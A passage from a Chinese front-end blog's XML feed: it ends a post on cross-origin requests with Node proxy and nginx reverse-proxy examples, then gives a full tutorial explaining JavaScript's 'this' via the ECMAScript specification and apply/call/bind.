src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      $.ajax(&#123;</span><br><span class="line">        url: &apos;http://localhost:3000&apos;,</span><br><span class="line">        type: &apos;post&apos;,</span><br><span class="line">        data: &#123; name: &apos;xiamen&apos;, password: &apos;123456&apos; &#125;,</span><br><span class="line">        contentType: &apos;application/json;charset=utf-8&apos;,</span><br><span class="line">        success: function(result) &#123;</span><br><span class="line">          console.log(result) // &#123;&quot;title&quot;:&quot;fontend&quot;,&quot;password&quot;:&quot;123456&quot;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(msg) &#123;</span><br><span class="line">          console.log(msg)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// server1.js 代理服务器(http://localhost:3000)</span><br><span class="line">const http = require(&apos;http&apos;)</span><br><span class="line">// 第一步：接受客户端请求</span><br><span class="line">const server = http.createServer((request, response) =&gt; &#123;</span><br><span class="line">  // 代理服务器，直接和浏览器直接交互，需要设置CORS 的首部字段</span><br><span class="line">  response.writeHead(200, &#123;</span><br><span class="line">    &apos;Access-Control-Allow-Origin&apos;: &apos;*&apos;,</span><br><span class="line">    &apos;Access-Control-Allow-Methods&apos;: &apos;*&apos;,</span><br><span class="line">    &apos;Access-Control-Allow-Headers&apos;: &apos;Content-Type&apos;</span><br><span class="line">  &#125;)</span><br><span class="line">  // 第二步：将请求转发给服务器</span><br><span class="line">  const proxyRequest = http</span><br><span class="line">    .request(</span><br><span class="line">      &#123;</span><br><span class="line">        host: &apos;127.0.0.1&apos;,</span><br><span class="line">        port: 4000,</span><br><span class="line">        url: &apos;/&apos;,</span><br><span class="line">        method: request.method,</span><br><span class="line">        headers: request.headers</span><br><span class="line">      &#125;,</span><br><span class="line">      serverResponse =&gt; &#123;</span><br><span class="line">        // 第三步：收到服务器的响应</span><br><span class="line">        var body = &apos;&apos;</span><br><span class="line">        serverResponse.on(&apos;data&apos;, chunk =&gt; &#123;</span><br><span class="line">          body += chunk</span><br><span class="line">        &#125;)</span><br><span class="line">        serverResponse.on(&apos;end&apos;, () =&gt; &#123;</span><br><span class="line">          console.log(&apos;The data is &apos; + body)</span><br><span class="line">          // 第四步：将响应结果转发给浏览器</span><br><span class="line">          response.end(body)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">    .end()</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(3000, () =&gt; &#123;</span><br><span class="line">  console.log(&apos;The proxyServer is running at http://localhost:3000&apos;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// server2.js(http://localhost:4000)</span><br><span class="line">const http = require(&apos;http&apos;)</span><br><span class="line">const data = &#123; title: &apos;fontend&apos;, password: &apos;123456&apos; &#125;</span><br><span class="line">const server = http.createServer((request, response) =&gt; &#123;</span><br><span class="line">  if (request.url === &apos;/&apos;) &#123;</span><br><span class="line">    response.end(JSON.stringify(data))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(4000, () =&gt; &#123;</span><br><span class="line">  console.log(&apos;The server is running at http://localhost:4000&apos;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="nginx反向代理"><a href="#nginx反向代理" class="headerlink" title="nginx反向代理"></a>nginx反向代理</h3><p>实现原理类似于Node中间件代理，需要你搭建一个中转nginx服务器，用于转发请求。使用nginx反向代理实现跨域，是最简单的跨域方式。只需要修改nginx的配置即可解决跨域问题，支持所有浏览器，支持session，不需要修改任何代码，并且不会影响服务器性能。</p><p>实现思路：通过nginx配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// proxy服务器</span><br><span class="line">server &#123;</span><br><span class="line">    listen       81;</span><br><span class="line">    server_name  www.domain1.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass   http://www.domain2.com:8080;  #反向代理</span><br><span class="line">        proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line"></span><br><span class="line">        # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用</span><br><span class="line">        add_header Access-Control-Allow-Origin http://www.domain1.com;  #当前端只跨域不带cookie时，可为*</span><br><span class="line">        add_header Access-Control-Allow-Credentials true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后通过命令行nginx -s reload启动nginx<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// index.html</span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">// 前端开关：浏览器是否读写cookie</span><br><span class="line">xhr.withCredentials = true;</span><br><span class="line">// 访问nginx中的代理服务器</span><br><span class="line">xhr.open(&apos;get&apos;, &apos;http://www.domain1.com:81/?user=admin&apos;, true);</span><br><span class="line">xhr.send();</span><br><span class="line"></span><br><span class="line">// server.js</span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line">var server = http.createServer();</span><br><span class="line">var qs = require(&apos;querystring&apos;);</span><br><span class="line">server.on(&apos;request&apos;, function(req, res) &#123;</span><br><span class="line">    var params = qs.parse(req.url.substring(2));</span><br><span class="line">    // 向前台写cookie</span><br><span class="line">    res.writeHead(200, &#123;</span><br><span class="line">        &apos;Set-Cookie&apos;: &apos;l=a123456;Path=/;Domain=www.domain2.com;HttpOnly&apos;   // HttpOnly:脚本无法读取</span><br><span class="line">    &#125;);</span><br><span class="line">    res.write(JSON.stringify(params));</span><br><span class="line">    res.end();</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(&apos;8080&apos;);</span><br><span class="line">console.log(&apos;Server is running at port 8080...&apos;);</span><br></pre></td></tr></table></figure></p><blockquote><p>参考链接：<a href="https://juejin.im/post/5c23993de51d457b8c1f4ee1" target="_blank" rel="noopener">九种跨域方式实现原理（浪里行舟）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从ECMAScript规范解读this</title>
      <link href="/%E4%BB%8EECMAScript%E8%A7%84%E8%8C%83%E8%A7%A3%E8%AF%BBthis.html"/>
      <url>/%E4%BB%8EECMAScript%E8%A7%84%E8%8C%83%E8%A7%A3%E8%AF%BBthis.html</url>
      
        <content type="html"><![CDATA[<p>说起JavaScript中的 <code>this</code> ，一直是一个非常让人头痛的东西，我们常会见到相关书籍和文章中用这样一句话来概括 this 的指向。</p><blockquote><p>this 为引用函数当前执行的环境对象。</p></blockquote><p>然而这样的描述却十分的抽象，最近拜读了某位大佬从ECMAScript规范对this的解读，有一种豁然开朗的感觉，本文更像是一篇笔记，里面也包含了一些我对this的理解，供分享学习。</p><a id="more"></a><h2 id="Types"><a href="#Types" class="headerlink" title="Types"></a>Types</h2><blockquote><p>Types are further subclassified into ECMAScript language types and specification types.<br>An ECMAScript language type corresponds to values that are directly manipulated by an ECMAScript programmer using the ECMAScript language. The ECMAScript language types are Undefined, Null, Boolean, String, Number, and Object.<br>A specification type corresponds to meta-values that are used within algorithms to describe the semantics of ECMAScript language constructs and ECMAScript language types. The specification types are Reference, List, Completion, Property Descriptor, Property Identifier, Lexical Environment, and Environment Record.</p></blockquote><p>ECMAScript 的类型分为语言类型和规范类型。<br>ECMAScript 语言类型是开发者直接使用 ECMAScript 可以操作的。其实就是我们常说的Undefined, Null, Boolean, String, Number, 和 Object。<br>而规范类型相当于 meta-values，是用来用算法描述 ECMAScript 语言结构和 ECMAScript 语言类型的。规范类型包括：Reference, List, Completion, Property Descriptor, Property Identifier, Lexical Environment, 和 Environment Record。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Reference 是一个 Specification Type，也就是 “只存在于规范里的抽象类型”。它们是为了更好地描述语言的底层行为逻辑才存在的，但并不存在于实际的 js 代码中。</p><blockquote><p>A Reference is a resolved name binding.<br>A Reference consists of three components, the base value, the referenced name and the Boolean valued strict reference flag.<br>The base value is either undefined, an Object, a Boolean, a String, a Number, or an environment record (10.2.1).<br>A base value of undefined indicates that the reference could not be resolved to a binding. The referenced name is a String.</p></blockquote><p>这段讲述了 Reference 的构成，由三个组成部分，分别是：</p><ul><li>base value：就是属性所在的对象或者就是 EnvironmentRecord，它的值只可能是 undefined, an Object, a Boolean, a String, a Number, or an environment record 其中的一种。</li><li>referenced name：就是属性的名称。</li><li>strict reference</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//示例1</span><br><span class="line">var foo = 1;</span><br><span class="line"></span><br><span class="line">// 对应的Reference是：</span><br><span class="line">var fooReference = &#123;</span><br><span class="line">    base: EnvironmentRecord,</span><br><span class="line">    name: &apos;foo&apos;,</span><br><span class="line">    strict: false</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//示例2</span><br><span class="line">var foo = &#123;</span><br><span class="line">    bar: function () &#123;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.bar(); // foo</span><br><span class="line"></span><br><span class="line">// bar对应的Reference是：</span><br><span class="line">var BarReference = &#123;</span><br><span class="line">    base: foo,</span><br><span class="line">    propertyName: &apos;bar&apos;,</span><br><span class="line">    strict: false</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>规范中还提供了获取 Reference 组成部分的方法，比如 GetBase 和 IsPropertyReference。</p><h3 id="GetBase"><a href="#GetBase" class="headerlink" title="GetBase"></a>GetBase</h3><blockquote><p>GetBase(V). Returns the base value component of the reference V.</p></blockquote><p>返回 reference 的 base value。</p><h3 id="IsPropertyReference"><a href="#IsPropertyReference" class="headerlink" title="IsPropertyReference"></a>IsPropertyReference</h3><blockquote><p>IsPropertyReference(V). Returns true if either the base value is an object or HasPrimitiveBase(V) is true; otherwise returns false.</p></blockquote><p>简单的理解：如果 base value 是一个对象，就返回true。</p><h2 id="GetValue"><a href="#GetValue" class="headerlink" title="GetValue"></a>GetValue</h2><p>GetValue 返回对象属性真正的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var foo = 1;</span><br><span class="line"></span><br><span class="line">var fooReference = &#123;</span><br><span class="line">    base: EnvironmentRecord,</span><br><span class="line">    name: &apos;foo&apos;,</span><br><span class="line">    strict: false</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">GetValue(fooReference) // 1;</span><br></pre></td></tr></table></figure></p><h2 id="MemberExpression"><a href="#MemberExpression" class="headerlink" title="MemberExpression"></a>MemberExpression</h2><ul><li>PrimaryExpression // 原始表达式 可以参见《JavaScript权威指南第四章》</li><li>FunctionExpression    // 函数定义表达式</li><li>MemberExpression [ Expression ] // 属性访问表达式</li><li>MemberExpression . IdentifierName // 属性访问表达式</li><li>new MemberExpression Arguments    // 对象创建表达式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); // MemberExpression 是 foo</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        console.log(this)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo()(); // MemberExpression 是 foo()</span><br><span class="line"></span><br><span class="line">var foo = &#123;</span><br><span class="line">    bar: function () &#123;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo.bar(); // MemberExpression 是 foo.bar</span><br></pre></td></tr></table></figure><p>所以简单理解 MemberExpression 其实就是()左边的部分。</p><h2 id="this-的确定步骤"><a href="#this-的确定步骤" class="headerlink" title="this 的确定步骤"></a>this 的确定步骤</h2><ul><li>计算 MemberExpression 的结果赋值给 ref</li><li>判断 ref 是不是一个 Reference 类型<blockquote><ol><li>如果 ref 是 Reference，并且 IsPropertyReference(ref) 是 true, 那么 this 的值为 GetBase(ref)</li><li>如果 ref 是 Reference，并且 base value 值是 Environment Record, 那么this的值为 ImplicitThisValue(ref)</li><li>如果 ref 不是 Reference，那么 this 的值为 undefined</li></ol></blockquote></li></ul><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">var foo = &#123;</span><br><span class="line">  value: 2,</span><br><span class="line">  bar: function () &#123;</span><br><span class="line">    return this.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//示例1</span><br><span class="line">console.log(foo.bar());</span><br><span class="line">//示例2</span><br><span class="line">console.log((foo.bar)());</span><br><span class="line">//示例3</span><br><span class="line">console.log((foo.bar = foo.bar)());</span><br><span class="line">//示例4</span><br><span class="line">console.log((false || foo.bar)());</span><br><span class="line">//示例5</span><br><span class="line">console.log((foo.bar, foo.bar)());</span><br></pre></td></tr></table></figure><h3 id="foo-bar"><a href="#foo-bar" class="headerlink" title="foo.bar()"></a>foo.bar()</h3><ul><li>判断MemberExpression 计算结果为 foo.bar</li><li><p>foo.bar的Reference</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var Reference = &#123;</span><br><span class="line">  base: foo,</span><br><span class="line">  name: &apos;bar&apos;,</span><br><span class="line">  strict: false</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>IsPropertyReference(ref) 是 true</p></li><li>返回GetBase()，为 <code>foo</code></li></ul><h3 id="foo-bar-1"><a href="#foo-bar-1" class="headerlink" title="(foo.bar)()"></a>(foo.bar)()</h3><ul><li>() 并没有对 MemberExpression 进行计算</li><li>判断MemberExpression 计算结果为 foo.bar</li><li><p>foo.bar的Reference</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var Reference = &#123;</span><br><span class="line">  base: foo,</span><br><span class="line">  name: &apos;bar&apos;,</span><br><span class="line">  strict: false</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>IsPropertyReference(ref) 是 true</p></li><li>返回GetBase()，为 <code>foo</code></li></ul><h3 id="foo-bar-foo-bar"><a href="#foo-bar-foo-bar" class="headerlink" title="(foo.bar = foo.bar)()"></a>(foo.bar = foo.bar)()</h3><ul><li>关于赋值运算符 <code>=</code> ，使用了 GetValue 进行赋值，所以返回值不为 Reference 类型</li><li>this 为 undefined</li><li>非严格模式下，this 的值为 undefined 的时候，其值会被隐式转换为全局对象</li></ul><h3 id="false-foo-bar"><a href="#false-foo-bar" class="headerlink" title="(false || foo.bar)()"></a>(false || foo.bar)()</h3><ul><li>关于逻辑运算符，使用了 GetValue 进行求值，所以返回值不为 Reference 类型</li><li>this 为 undefined</li><li>非严格模式下，this 的值为 undefined 的时候，其值会被隐式转换为全局对象</li></ul><h3 id="foo-bar-foo-bar-1"><a href="#foo-bar-foo-bar-1" class="headerlink" title="(foo.bar, foo.bar)()"></a>(foo.bar, foo.bar)()</h3><ul><li>关于逗号运算符，使用了 GetValue 进行运算，所以返回值不为 Reference 类型</li><li>this 为 undefined</li><li>非严格模式下，this 的值为 undefined 的时候，其值会被隐式转换为全局对象</li></ul><h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">var foo = &#123;</span><br><span class="line">  value: 2,</span><br><span class="line">  bar: function () &#123;</span><br><span class="line">    return this.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//示例1</span><br><span class="line">console.log(foo.bar()); // 2</span><br><span class="line">//示例2</span><br><span class="line">console.log((foo.bar)()); // 2</span><br><span class="line">//示例3</span><br><span class="line">console.log((foo.bar = foo.bar)()); // 1</span><br><span class="line">//示例4</span><br><span class="line">console.log((false || foo.bar)()); // 1</span><br><span class="line">//示例5</span><br><span class="line">console.log((foo.bar, foo.bar)()); // 1</span><br><span class="line">//示例6</span><br></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><ul><li>MemberExpression 是 foo</li><li><p>foo 的 Reference</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var fooReference = &#123;</span><br><span class="line">    base: EnvironmentRecord,</span><br><span class="line">    name: &apos;foo&apos;,</span><br><span class="line">    strict: false</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>base value 是 Environment Record，调用 ImplicitThisValue(ref)</p></li><li>ImplicitThisValue 方法始终返回 undefined。</li></ul><h2 id="改变this指向"><a href="#改变this指向" class="headerlink" title="改变this指向"></a>改变this指向</h2><h3 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h3><p>箭头函数的 this 始终指向函数定义时的 this，而非执行时。箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则，this 为 undefined。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)     </span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout( () =&gt; &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;,100);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()     // Cherry</span><br></pre></td></tr></table></figure></p><h3 id="在函数内部使用-this-this"><a href="#在函数内部使用-this-this" class="headerlink" title="在函数内部使用 _this = this"></a>在函数内部使用 _this = this</h3><p>利用 _this 保存 this 对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">var a = &#123;</span><br><span class="line"></span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)     </span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        var _this = this;</span><br><span class="line">        setTimeout( function() &#123;</span><br><span class="line">            _this.func1()</span><br><span class="line">        &#125;,100);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()       // Cherry</span><br></pre></td></tr></table></figure></p><h3 id="使用-apply、call、bind"><a href="#使用-apply、call、bind" class="headerlink" title="使用 apply、call、bind"></a>使用 apply、call、bind</h3><h4 id="apply"><a href="#apply" class="headerlink" title="apply"></a>apply</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout(  function () &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;.apply(a),100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()            // Cherry</span><br></pre></td></tr></table></figure><h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout(  function () &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;.call(a),100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()            // Cherry</span><br></pre></td></tr></table></figure><h4 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout(  function () &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;.bind(a)(),100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()            // Cherry</span><br></pre></td></tr></table></figure><h2 id="apply、call、bind-区别"><a href="#apply、call、bind-区别" class="headerlink" title="apply、call、bind 区别"></a>apply、call、bind 区别</h2><h3 id="apply-和-call-的区别"><a href="#apply-和-call-的区别" class="headerlink" title="apply 和 call 的区别"></a>apply 和 call 的区别</h3><p>apply 和 call 基本类似，他们的区别只是传入的参数不同。</p><p>apply 的语法为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fun.apply(thisArg, [argsArray])</span><br></pre></td></tr></table></figure></p><p>call 的语法为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fun.call(thisArg[, arg1[, arg2[, ...]]])</span><br></pre></td></tr></table></figure></p><h3 id="bind-和-apply、call-区别"><a href="#bind-和-apply、call-区别" class="headerlink" title="bind 和 apply、call 区别"></a>bind 和 apply、call 区别</h3><p>bind 是创建一个新的函数，我们必须要手动去调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a =&#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line">    fn : function (a,b) &#123;</span><br><span class="line">        console.log( a + b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var b = a.fn;</span><br><span class="line">b.bind(a,1,2)()           // 3</span><br></pre></td></tr></table></figure></p><blockquote><p>参考链接：<a href="https://juejin.im/post/590159d8a22b9d0065c2d918" target="_blank" rel="noopener">JavaScript深入系列15篇（冴羽）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript执行机制</title>
      <link href="/JavaScript%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6.html"/>
      <url>/JavaScript%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6.html</url>
      
